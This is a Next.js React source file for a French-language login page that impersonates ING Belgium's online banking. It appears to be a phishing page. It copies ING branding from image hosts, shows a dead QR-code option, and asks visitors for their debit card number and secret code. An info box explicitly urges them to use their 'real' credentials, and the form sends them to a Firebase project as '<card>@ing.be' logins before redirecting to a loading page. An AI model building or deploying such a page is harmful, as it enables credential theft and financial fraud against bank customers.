"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Checkbox } from "@/components/ui/checkbox";
import { AlertTriangle, ChevronRight, Info, HelpCircle, QrCode, Smartphone, LoaderCircle } from "lucide-react";
import { useAuth } from "@/firebase";
import { signInWithEmailAndPassword } from "firebase/auth";

export default function LoginPage() {
  const router = useRouter();
  const auth = useAuth();
  const [loginMethod, setLoginMethod] = useState<'qr' | 'card'>('card');
  const [accountNumber, setAccountNumber] = useState("");
  const [secretCode, setSecretCode] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Déconnecter l'utilisateur à l'arrivée sur la page
  useEffect(() => {
    localStorage.removeItem("isAuthenticated");
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsSubmitting(true);

    try {
      // Transformation du numéro de carte en email pour Firebase Auth
      const authEmail = `${accountNumber}@ing.be`;
      const authPassword = secretCode;

      await signInWithEmailAndPassword(auth, authEmail, authPassword);
      
      localStorage.setItem("isAuthenticated", "true");
      router.push("/loading");
    } catch (err: any) {
      console.error("Login error:", err);
      setError("Identifiants incorrects ou compte inexistant. Veuillez vérifier vos informations.");
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative bg-[#f4f4f4] overflow-x-hidden font-body">
      {/* Filigrane Lion 100% Visible */}
      <div className="watermark-lion">
        <Image 
          src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773745069/Capture_d_%C3%A9cran_2026-03-17_104810_ovk3l7.png" 
          alt="ING Lion Filigrane" 
          width={700} 
          height={700} 
          className="object-contain"
          priority
        />
      </div>

      <header className="w-full p-6 flex justify-between items-center z-10 max-w-7xl mx-auto">
        <div className="flex-1">
          <Image
            src="https://i.imgur.com/WWZ10oQ.png"
            alt="ING Logo"
            width={120}
            height={48}
            className="h-10 w-auto"
          />
        </div>
        <div className="flex-1 flex justify-end gap-4 text-sm font-bold text-gray-400">
          <button className="hover:text-primary transition-colors">NL</button>
          <span>|</span>
          <button className="text-primary underline decoration-2 underline-offset-4">FR</button>
          <span>|</span>
          <button className="hover:text-primary transition-colors">EN</button>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-start pt-8 px-6 z-10 space-y-8 w-full mb-20">
        {loginMethod === 'qr' ? (
          <Card className="w-full max-w-2xl border border-gray-200 ing-card-shadow bg-white rounded-md overflow-hidden transition-all duration-300">
            <CardHeader className="pt-8 pb-4">
              <CardTitle className="text-2xl font-black text-[#ff6200] px-4">
                Se connecter avec le code QR ING
              </CardTitle>
            </CardHeader>
            <CardContent className="px-10 pb-10">
              <div className="flex flex-col md:flex-row gap-8 items-start mb-8">
                <div className="flex-shrink-0 w-64 h-64 bg-gray-50 border border-gray-100 rounded-lg flex flex-col items-center justify-center relative overflow-hidden shadow-sm mx-auto md:mx-0">
                  <Image 
                    src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773756428/t%C3%A9l%C3%A9charger_nlacn3.gif" 
                    alt="ING QR Code" 
                    fill
                    className="object-contain p-4"
                  />
                  <div className="absolute inset-0 bg-white/60 backdrop-blur-[2px] z-10 rounded-lg" />
                  <AlertTriangle className="h-16 w-16 text-[#ff6200] mb-4 z-20" />
                  <Button className="ing-btn-blue z-20 font-bold px-6 h-10 rounded-sm">
                    Réessayer
                  </Button>
                </div>
                <div className="flex-1 space-y-6 pt-2">
                  <ol className="list space-y-6">
                    <li className="list__item flex gap-4 items-start">
                      <div className="bg-primary text-white rounded-full w-8 h-8 flex items-center justify-center flex-shrink-0 text-sm font-black mt-0.5">1</div>
                      <p className="text-lg text-[#333] font-medium leading-tight">Ouvrez votre app ING Banking.</p>
                    </li>
                    <li className="list__item flex gap-4 items-start">
                      <div className="bg-primary text-white rounded-full w-8 h-8 flex items-center justify-center flex-shrink-0 text-sm font-black mt-0.5">2</div>
                      <div className="text-lg text-[#333] flex items-center gap-3 font-medium leading-tight">
                        Cliquez sur l'icône QR Code
                        <div className="bg-[#e6f2ff] p-2 rounded">
                          <QrCode className="h-6 w-6 text-[#0066cc]" />
                        </div>
                      </div>
                    </li>
                    <li className="list__item flex gap-4 items-start">
                      <div className="bg-primary text-white rounded-full w-8 h-8 flex items-center justify-center flex-shrink-0 text-sm font-black mt-0.5">3</div>
                      <p className="text-lg text-[#333] font-medium leading-tight">Et scannez le code QR ING.</p>
                    </li>
                  </ol>
                </div>
              </div>
              <div className="flex items-center justify-start border-t border-gray-100 pt-6">
                <button className="flex items-center text-base font-bold text-[#0066cc] hover:underline gap-2">
                  Besoin d'aide?
                </button>
              </div>
            </CardContent>
          </Card>
        ) : (
          <Card className="w-full max-w-2xl border border-gray-200 ing-card-shadow bg-white rounded-md transition-all duration-300">
            <CardHeader className="pt-8 pb-4">
              <CardTitle className="text-2xl font-black text-[#ff6200] px-4">
                Identification par lecteur de carte ING
              </CardTitle>
            </CardHeader>
            <CardContent className="px-10 pb-10">
              <div className="flex flex-col items-center mb-8">
                {/* Image du lecteur au-dessus */}
                <div className="bg-gray-50 p-6 rounded-lg border border-gray-100 shadow-inner mb-6 transition-transform hover:scale-105">
                  <Image 
                    src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773755068/Capture_d_%C3%A9cran_2026-03-17_114314_ceprzy.png" 
                    alt="Lecteur de carte ING" 
                    width={180} 
                    height={180}
                    className="object-contain"
                  />
                </div>
                
                <form onSubmit={handleLogin} className="space-y-6 w-full max-w-md">
                  {error && (
                    <Alert variant="destructive" className="rounded-sm py-3 px-4 mb-6">
                      <AlertTriangle className="h-5 w-5" />
                      <AlertDescription className="text-sm font-bold ml-2">{error}</AlertDescription>
                    </Alert>
                  )}
                  <div className="space-y-2">
                    <Label htmlFor="cardNumber" className="text-[#333] font-bold text-base">Numéro de carte de débit</Label>
                    <Input
                      id="cardNumber"
                      type="text"
                      className="h-12 text-base bg-white border-gray-300 focus:border-primary rounded-sm shadow-none font-medium px-4"
                      required
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="secretCode" className="text-[#333] font-bold text-base">Code Secret / ING ID</Label>
                    <Input
                      id="secretCode"
                      type="password"
                      className="h-12 text-base bg-white border-gray-300 focus:border-primary rounded-sm shadow-none font-medium px-4"
                      required
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                    />
                  </div>
                  <div className="flex items-center space-x-3 pt-2">
                    <Checkbox id="saveInfo" className="w-5 h-5 rounded-sm border-gray-300 data-[state=checked]:bg-primary data-[state=checked]:border-primary" />
                    <Label htmlFor="saveInfo" className="text-base text-gray-600 font-medium cursor-pointer">Enregistrer ces informations</Label>
                  </div>
                </form>
              </div>

              <div className="ing-info-box p-6 rounded-r-md flex gap-4 items-start mb-8">
                <Info className="h-6 w-6 text-[#0066cc] mt-1 flex-shrink-0" />
                <div className="text-base text-[#0066cc] font-medium leading-relaxed">
                  Utilisez votre numéro de carte et votre code secret réel pour accéder à votre espace sécurisé.
                  <a href="#" className="font-black underline ml-2 block mt-2 hover:text-[#004d99]">Plus d'infos</a>
                </div>
              </div>

              <div className="flex items-center justify-between border-t border-gray-100 pt-6">
                <button className="flex items-center text-base font-bold text-[#0066cc] hover:underline gap-2">
                  <HelpCircle className="h-5 w-5" />
                  Aide et information
                </button>
                <Button 
                  onClick={handleLogin}
                  disabled={isSubmitting}
                  className="bg-[#ff6200] hover:bg-[#e05600] text-white font-black text-xl h-12 px-10 rounded-sm shadow-none transition-all active:scale-[0.98]"
                >
                  {isSubmitting ? <LoaderCircle className="h-6 w-6 animate-spin" /> : "Suivant"}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="w-full max-w-2xl space-y-6">
          <h3 className="text-[#ff6200] font-black text-xl px-2 tracking-tight">Choisissez une autre méthode pour vous connecter</h3>
          <Card className="border border-gray-200 ing-card-shadow bg-white rounded-md overflow-hidden">
            <CardContent className="p-0">
              {/* Option itsme avec logo circulaire */}
              <button className="w-full flex items-center justify-between px-8 py-6 hover:bg-gray-50 transition-colors border-b border-gray-100 group">
                <div className="flex items-center gap-6">
                  <div className="h-14 w-14 relative flex items-center justify-center bg-white rounded-full border border-gray-100 overflow-hidden shadow-sm">
                    <Image 
                        src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773755603/Capture_d_%C3%A9cran_2026-03-17_114322_m5vzbi.png" 
                        alt="itsme" 
                        fill
                        className="object-cover p-2"
                    />
                  </div>
                  <span className="font-black text-[#333] text-xl">itsme</span>
                </div>
                <ChevronRight className="h-6 w-6 text-gray-300 group-hover:text-primary transition-all group-hover:translate-x-2" />
              </button>

              <button 
                onClick={() => setLoginMethod(loginMethod === 'qr' ? 'card' : 'qr')}
                className="w-full flex items-center justify-between px-8 py-6 hover:bg-gray-50 transition-colors group"
              >
                <div className="flex items-center gap-6">
                  <div className="h-14 w-14 flex items-center justify-center bg-white rounded-full border border-gray-100 shadow-sm transition-all group-hover:ring-2 group-hover:ring-primary/20">
                    {loginMethod === 'qr' ? (
                      <Smartphone className="h-8 w-8 text-primary" />
                    ) : (
                      <QrCode className="h-8 w-8 text-primary" />
                    )}
                  </div>
                  <span className="font-black text-[#333] text-xl">
                    {loginMethod === 'qr' ? 'ING Card Reader' : 'ING QR Code'}
                  </span>
                </div>
                <ChevronRight className="h-6 w-6 text-gray-300 group-hover:text-primary transition-all group-hover:translate-x-2" />
              </button>
            </CardContent>
          </Card>
        </div>
      </main>

      <footer className="w-full py-10 px-6 flex flex-wrap justify-center gap-x-10 gap-y-4 text-base font-bold text-gray-400 z-10 bg-transparent">
        <a href="#" className="hover:text-primary transition-colors">Sécurité en ligne</a>
        <a href="#" className="hover:text-primary transition-colors">Vie Privée</a>
        <a href="#" className="hover:text-primary transition-colors">Règlement Général des Opérations</a>
      </footer>
    </div>
  );
}
